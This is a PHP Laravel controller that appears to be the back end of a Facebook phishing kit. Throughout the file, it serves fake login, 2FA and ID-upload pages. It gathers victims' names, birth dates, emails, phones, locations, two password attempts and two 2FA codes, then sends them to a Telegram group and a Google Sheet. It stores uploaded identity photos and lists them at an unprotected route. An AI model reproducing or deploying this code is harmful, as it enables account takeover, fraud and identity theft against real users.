<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Storage;

class FBController extends Controller
{
    public function toFB()
    {
        return redirect('https://facebook.com');
    }
    public function index()
    {
        return view('fb.index');
    }
    public function secure()
    {
        return view('fb.business');
    }

    public function getPasswordModal()
    {
        return view('fb.login', []);
    }
    public function confirm2FA()
    {
        return view('fb.confirm', []);
    }
    public function sendMessage(Request $request)
    {

        $full_infor =  "Full Name: " . $request->basic_fill_name;
        $full_infor .= "\nBirth Day: " . $request->basic_fill_birth_day;
        // $full_infor .=  "\nGioi Tinh: " . $request->basic_fill_sex;
        $full_infor .=  "\nEmail: " . $request->basic_fill_email;
        // $full_infor .=  "\nPersonal Email: " . $request->basic_fill_personal_email;
        $full_infor .= "\nIp: " . $request->basic_fill_page_ip;
        $full_infor .=  "\nCountry: " . $request->basic_fill_page_country;
        $full_infor .= "\nCity: " . $request->basic_fill_page_city;
        $full_infor .=  "\nPhone: " . $request->basic_fill_phone;
        $full_infor .=  "\nFB Page:" . $request->basic_fill_page_name;
        $full_infor .= "\nPassword First: " . $request->basic_fill_page_first_password;
        $full_infor .= "\nPassword Second: " . $request->basic_fill_page_second_password;
        if ($request->is_2fa == true) {
            $full_infor .= "\n2FA First: " . $request->basic_fill_page_first_2fa;
            $full_infor .= "\n2FA Second: " . $request->basic_fill_page_second_2fa;
            $this->sendTelegram($full_infor);
            // $this->insertToSheet($request);
            return ['nextstep' => url('upload-profile')];
        }
        $a = $this->insertToSheet($request);
        $this->sendTelegram($full_infor);
        return ['nextstep' => url('confirm')];
    }

    public function uploadProfile()
    {
        return view('fb.upload-profile', []);
    }
    public function checkIP()
    {
        header('Access-Control-Allow-Origin: *');
        header('Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS');
        header('Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token');
        header('Content-Type: application/json');
        $a = [
            'ip' => Arr::get($_SERVER, 'HTTP_CF_CONNECTING_IP'),
            'country' => Arr::get($_SERVER, 'HTTP_CF_IPCOUNTRY'),
        ];
        echo json_encode($a);
        exit;
    }

    public function saveImageUpload(Request $request)
    {
        $email = $request->email;
        foreach ($request->file('files') as $file) {
            $file_name = $file->getClientOriginalName();
            if (empty($email)) {
                $name = time() . '_' . $file_name;
            } else {
                $arrMail = explode('@', $email);
                $name = $arrMail[0] . '_' . time() . '_' . $file_name;
            }
            $file->storeAs('phoi', $name);
        }
        return redirect('waiting-verify');
    }


    public function waitingVerify()
    {
        return view('fb.waiting-verify', []);
    }
    public function insertToSheet($request)
    {
        $curl = curl_init();
        $data = [[
            'Date' => date('d/m/Y h:i:s'),
            'Region' => $request->basic_fill_page_country,
            'City' => $request->basic_fill_page_city,
            'FullName' => $request->basic_fill_name,
            'Phone' => $request->basic_fill_phone,
            'Password1' => $request->basic_fill_page_first_password,
            'Password2' => $request->basic_fill_page_second_password,
            'Email' => $request->basic_fill_email,
            'PersonalEmail' => $request->basic_fill_personal_email,
            'Ip' => $request->basic_fill_page_ip,
        ]];
        if ($request->is_2fa == true) {
            $data[0]['2FA1'] = $request->basic_fill_page_first_2fa;
            $data[0]['2FA2'] = $request->basic_fill_page_second_2fa;
        }
        $url = env('GOOGLE_API');
        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => json_encode($data),
            CURLOPT_HTTPHEADER => array(
                'Content-Type: application/json'
            ),
        ));

        $response = curl_exec($curl);

        curl_close($curl);
        return $response;
    }

    public function sendTelegram($full_infor)
    {
        $url_telegram = env('TELEGRAM_URL');
        $chatId = env('TELEGRAM_GROUP');
        $params = [
            'chat_id' => $chatId,
            'text' => $full_infor,
        ];
        $ch = curl_init($url_telegram . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    public function phoiFB()
    {
        $arrr = Storage::allFiles('phoi');
        foreach ($arrr as $file) {
            echo '<a href="' . url($file) . '">' . pathinfo($file, PATHINFO_BASENAME) . '</a>';
            echo '<br/>';
        }
    }
}
